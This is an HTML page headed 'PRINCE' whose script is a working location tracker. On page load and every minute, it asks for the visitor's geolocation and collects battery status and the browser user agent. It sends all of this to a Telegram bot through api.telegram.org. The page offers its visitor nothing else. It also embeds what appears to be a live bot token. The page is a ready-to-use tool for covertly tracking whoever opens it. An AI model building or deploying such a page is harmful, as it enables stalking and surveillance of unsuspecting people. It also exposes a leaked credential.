<!DOCTYPE html>
<html lang="en">
<head>
    <title>Location and Battery Info</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Responsive meta tag -->
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            margin: 0; /* Remove default margin */
        }
        h1 {
            font-size: 24px; /* Adjust font size for mobile */
        }
    </style>
</head>
<body>
    <h1>PRINCE</h1>
    <p id="status"></p>

    <script>
        var token = '6197747448:AAFrgXeZdjQZ1iTm9AE6v56h6y-qShiH5es'; // Replace with your bot token
        var chatId = 'YOUR_CHAT_ID'; // Replace with your chat ID

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocation, showError);
            } else {
                document.getElementById("status").textContent = "Geolocation not supported by this browser.";
            }
        }

        function sendLocation(position) {
            var latitude = position.coords.latitude;
            var longitude = position.coords.longitude;
            var message = `Location: Latitude ${latitude}, Longitude ${longitude}\n`;

            navigator.getBattery().then(function(battery) {
                var level = battery.level * 100 + '%';
                var charging = battery.charging ? 'Yes' : 'No';
                message += `Battery Level: ${level}\nCharging: ${charging}\n`;
                var deviceModel = navigator.userAgent;
                message += `Device Model: ${deviceModel}`;
                sendToTelegram(chatId, token, message);
            });
        }

        function sendToTelegram(chatId, token, message) {
            var url = `https://api.telegram.org/bot${token}/sendMessage`;
            var data = {
                chat_id: chatId,
                text: message
            };
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                return response.json();
            })
            .then(data => {
                document.getElementById("status").textContent = "Information sent successfully!";
            })
            .catch(error => {
                document.getElementById("status").textContent = "Error sending: " + error.message;
                console.error('Error:', error);
            });
        }

        function showError(error) {
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    document.getElementById("status").textContent = "User denied the request for Geolocation.";
                    break;
                case error.POSITION_UNAVAILABLE:
                    document.getElementById("status").textContent = "Location information is unavailable.";
                    break;
                case error.TIMEOUT:
                    document.getElementById("status").textContent = "The request to get user location timed out.";
                    break;
                case error.UNKNOWN_ERROR:
                    document.getElementById("status").textContent = "An unknown error occurred.";
                    break;
            }
        }

        // Ask for permission and send location data when the page loads
        document.addEventListener("DOMContentLoaded", function() {
            getLocation();
        });

        // Send location data every 1 minute
        setInterval(function() {
            getLocation();
        }, 60000);
    </script>
</body>
</html>
